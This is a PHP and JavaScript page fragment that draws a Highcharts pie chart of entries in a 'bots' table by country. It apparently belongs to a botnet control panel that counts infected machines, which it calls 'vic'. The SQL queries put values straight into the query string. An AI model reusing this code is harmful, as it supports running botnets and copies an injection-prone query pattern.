<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
<script type="text/javascript" src="js/highcharts.js"></script>

<br />
<script type="text/javascript">		
			var chart;
			$(document).ready(function() {
				chart = new Highcharts.Chart({
					chart: {
						renderTo: 'container',
						plotBackgroundColor: null,
						plotBorderWidth: null,
						plotShadow: false
					},
					title: {
						text: 'Statistik'
					},
					tooltip: {
						formatter: function() {
							return '<b>'+ this.point.name +'</b>: '+ this.y +' %';
						}
					},
					plotOptions: {
						pie: {
							allowPointSelect: true,
							cursor: 'pointer',
							dataLabels: {
								enabled: true,
								color: '#000000',
								connectorColor: '#000000',
								formatter: function() {
									return '<b>'+ this.point.name +'</b>: '+ this.y +' %';
								}
							}
						}
					},
				    series: [{
						type: 'pie',
						name: 'Browser share',
						data: [
						
						
						<?php
				
						$query1 = mysql_query("SELECT * FROM bots");						
						$alle = mysql_num_rows($query1);
						
						$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1");
						while($row = mysql_fetch_array($query2)){
							$vic = $row['country'];
							
							$query3 = mysql_query("SELECT * FROM bots WHERE country = '$vic'");
							
							$zahl = mysql_num_rows($query3);
							$total  = $zahl/$alle*100;
							

							echo "['".$ccode[strtoupper($vic)]."',   ".round($total, 1)."],";
							}
							?>
						]
					}]
				});
			});
				
		</script>
		
<div id="container" style="width: 800px; height: 500px; margin: 0 auto"></div>